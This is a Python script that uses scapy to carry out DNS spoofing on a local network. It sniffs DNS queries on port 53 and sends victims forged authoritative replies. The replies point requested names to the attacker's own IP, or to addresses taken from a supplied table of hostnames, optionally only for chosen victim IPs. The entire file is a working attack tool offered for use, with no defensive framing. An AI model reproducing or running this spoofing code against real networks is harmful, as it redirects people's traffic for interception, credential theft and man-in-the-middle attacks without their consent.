#!/usr/bin/env python
import argparse
import subprocess
from scapy.all import *
attacker_ip = subprocess.check_output(['hostname', '--all-ip-addresses'])[:-2]
dns_filter = 'udp port 53'
expression = None
hostname = None
interface = None
poison_table = {}

'''
    Recieves a packet and the poisonous ip. Creates a Spoofed Packet and Sends it to the victim
'''
def send_spoofed_packet(pkt,poisoned_ip):
    spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
                      an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=poisoned_ip))
    send(spoofed_pkt)
    print 'Posioned Response:',poisoned_ip
    print 'Sent packet', spoofed_pkt.summary()


'''
    Recieves a packet from the victim and creates the poisonous ip based on the options provided    
'''
def spoof_dns(pkt):
    if expression is None or len(expression) == 0 or pkt[IP].src in expression > 0:
        if pkt.haslayer(DNSQR):
            victims_query = pkt[DNSQR].qname
            print 'Victim\'s Query:',victims_query
            if hostname is None:
                send_spoofed_packet(pkt,attacker_ip)
            else:
                if victims_query.rstrip('.') in poison_table:
                    send_spoofed_packet(pkt,poison_table[victims_query.rstrip('.')])


'''
    Parses the command line arguments
'''
def parse_cmd_line_args():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument('-i')
    parser.add_argument('-h')
    parser.add_argument('expression', nargs='*', action="store")
    args = parser.parse_args()
    return args.i, args.h, args.expression

'''
    Main function
'''
if __name__ == '__main__':
    interface, hostname, expression = parse_cmd_line_args()
    if hostname:
        print 'Poisoning Query Table read from: ',hostname
        with open(hostname) as fp:
            for line in fp:
                val,key = line.strip().split()
                poison_table[key] = val
    else:
        print 'Poisoning Victim\'s Query with Attacker IP'
    if expression:
        print 'Intended Victim:',expression 
    if interface:
        print "Capture on interface",interface
        sniff(filter=dns_filter, iface=interface, store=0, prn=spoof_dns)
    else:
        print "Capture on all interfaces"
        sniff(filter=dns_filter, store=0, prn=spoof_dns)
